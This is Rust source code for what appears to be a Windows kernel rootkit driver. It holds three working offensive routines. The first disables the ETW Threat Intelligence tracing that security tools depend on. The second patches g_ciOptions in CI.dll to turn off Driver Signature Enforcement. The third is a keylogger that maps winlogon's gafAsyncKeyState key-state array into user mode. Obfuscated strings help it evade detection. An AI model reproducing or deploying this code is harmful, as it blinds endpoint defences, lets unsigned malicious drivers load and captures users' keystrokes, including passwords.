use core::{ffi::c_void, ptr::null_mut};
use obfstr::obfstr;
use wdk_sys::{
    _MEMORY_CACHING_TYPE::MmCached, _MM_PAGE_PRIORITY::NormalPagePriority, _MODE::UserMode,
    ntddk::*, *,
};

use crate::{
    address::{get_function_address, get_module_base_address},
    attach::ProcessAttach,
    error::ShadowError,
    patterns::{ETWTI_PATTERN, scan_for_pattern},
    *,
};

/// Represents ETW (Event Tracing for Windows) in the operating system.
pub struct Etw;

impl Etw {
    /// Enables or disables ETW (Event Tracing for Windows) tracing by modifying the ETWTI structure.
    ///
    /// # Arguments
    ///
    /// * `enable` - A boolean flag indicating whether to enable (`true`) or disable (`false`) ETW tracing.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - If the operation is successful.
    /// * `Err(ShadowError)` - If any error occurs while finding the function or modifying the ETWTI structure.
    pub unsafe fn etwti_enable_disable(enable: bool) -> Result<NTSTATUS> {
        log::info!("etwti_enable_disable: {} ETWTI", if enable { "Enabling" } else { "Disabling" });
    
        // Convert the function name for lookup. We're still using KeInsertQueueApc
        // because it's exported and available.
        let mut function_name = uni::str_to_unicode(obfstr!("KeInsertQueueApc")).to_unicode();
        log::debug!("etwti_enable_disable: Function name (Unicode): {:?}", function_name);
    
        // Retrieve the system routine address.
        let function_address = MmGetSystemRoutineAddress(&mut function_name);
        if function_address.is_null() {
            log::error!("etwti_enable_disable: Failed to retrieve system routine address for KeInsertQueueApc");
            return Err(ShadowError::FunctionExecutionFailed("MmGetSystemRoutineAddress", line!()));
        }
        log::info!("etwti_enable_disable: Retrieved system routine address: {:p}", function_address);
    
        // Scan for the ETWTI structure using the fixed 7-byte pattern.
        // Use offset = 3 so that the 4-byte relative offset is read correctly,
        // and final_offset = 7 so that the returned address points immediately after the instruction.
        let etwi_handle = scan_for_pattern(function_address, &ETWTI_PATTERN, 3, 7, 0x1000)?;
        log::info!("etwti_enable_disable: Found ETWTI structure at address: {:p}", etwi_handle);
    
        // Calculate the TRACE_ENABLE_INFO structure address and update its IsEnabled field.
        let trace_info = etwi_handle.offset(0x20).offset(0x60) as *mut TRACE_ENABLE_INFO;
        log::info!("etwti_enable_disable: TRACE_ENABLE_INFO located at: {:p}", trace_info);
        let new_state = if enable { 0x01 } else { 0x00 };
        (*trace_info).IsEnabled = new_state;
        log::info!("etwti_enable_disable: Set TRACE_ENABLE_INFO::IsEnabled to {:#x}", new_state);
    
        log::info!("etwti_enable_disable: Operation successful");
        Ok(STATUS_SUCCESS)
    }
    
    
    
}

/// Represents Driver Signature Enforcement (DSE) in the operating system.
pub struct Dse;

impl Dse {
    /// Modifies the Driver Signature Enforcement (DSE) state.
    ///
    /// # Arguments
    ///
    /// * `enable` - A boolean flag indicating whether to enable (`true`) or disable (`false`) driver signature enforcement.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - If the operation is successful.
    /// * `Err(ShadowError)` - If the function fails to find or modify the DSE state.
    pub unsafe fn set_dse_state(enable: bool) -> Result<NTSTATUS> {
        // Get the base address of the CI.dll module, where the relevant function resides
        let module_address = get_module_base_address(obfstr!("CI.dll"))?;

        // Get the address of the CiInitialize function within CI.dll
        let function_address = get_function_address(obfstr!("CiInitialize"), module_address)?;

        // Search for the memory pattern that represents the initialization of DSE
        let instructions = [0x8B, 0xCD];
        let c_ip_initialize = scan_for_pattern(function_address, &instructions, 3, 7, 0x89)?;

        // Locate the g_ciOptions structure based on a pattern in the CiInitialize function
        let instructions = [0x49, 0x8b, 0xE9];
        let g_ci_options = scan_for_pattern(c_ip_initialize.cast(), &instructions, 5, 9, 0x21)?;

        // Modify g_ciOptions to either enable or disable DSE based on the input flag
        if enable {
            *(g_ci_options as *mut u64) = 0x0006_u64;
        } else {
            *(g_ci_options as *mut u64) = 0x000E_u64;
        }

        Ok(STATUS_SUCCESS)
    }
}

/// Represents keylogger operations in the system.
pub struct Keylogger;

impl Keylogger {
    /// Retrieves the address of the `gafAsyncKeyState` array in the `winlogon.exe` process and maps it to user-mode.
    ///
    /// # Returns
    ///
    /// * `Ok(*mut c_void)` - If successful, returns a pointer to the mapped user-mode address of `gafAsyncKeyState`.
    /// * `Err(ShadowError)` - If any error occurs while finding the address or mapping memory.
    pub unsafe fn get_user_address_keylogger() -> Result<*mut c_void> {
        // Get the PID of winlogon.exe
        let pid = get_process_by_name(obfstr!("winlogon.exe"))?;

        // Attach to the winlogon.exe process
        let winlogon_process = Process::new(pid)?;
        let attach_process = ProcessAttach::new(winlogon_process.e_process);

        // Retrieve the address of gafAsyncKeyState
        let gaf_async_key_state_address = Self::get_gafasynckeystate_address()?;

        // Allocate an MDL (Memory Descriptor List) to manage the memory
        let mdl = IoAllocateMdl(
            gaf_async_key_state_address.cast(),
            size_of::<[u8; 64]>() as u32,
            0,
            0,
            null_mut(),
        );
        if mdl.is_null() {
            return Err(ShadowError::FunctionExecutionFailed(
                "IoAllocateMdl",
                line!(),
            ));
        }

        // Build the MDL for the non-paged pool
        MmBuildMdlForNonPagedPool(mdl);

        // Map the locked pages into user-mode address space
        let address = MmMapLockedPagesSpecifyCache(
            mdl,
            UserMode as i8,
            MmCached,
            null_mut(),
            0,
            NormalPagePriority as u32,
        );
        if address.is_null() {
            IoFreeMdl(mdl);
            return Err(ShadowError::FunctionExecutionFailed(
                "MmMapLockedPagesSpecifyCache",
                line!(),
            ));
        }

        Ok(address)
    }

    /// Retrieves the address of the `gafAsyncKeyState` array.
    ///
    /// # Returns
    ///
    /// * `Ok(*mut u8)` - Returns a pointer to the `gafAsyncKeyState` array if found.
    /// * `Err(ShadowError)` - If the array is not found or an error occurs during the search.
    unsafe fn get_gafasynckeystate_address() -> Result<*mut u8> {
        // Get the base address of win32kbase.sys
        let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;

        // Get the address of the NtUserGetAsyncKeyState function
        let function_address =
            get_function_address(obfstr!("NtUserGetAsyncKeyState"), module_address)?;

        // Search for the pattern that identifies the gafAsyncKeyState array
        // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
        let pattern = [0x48, 0x8B, 0x05];
        scan_for_pattern(function_address, &pattern, 3, 7, 0x200)
    }
}
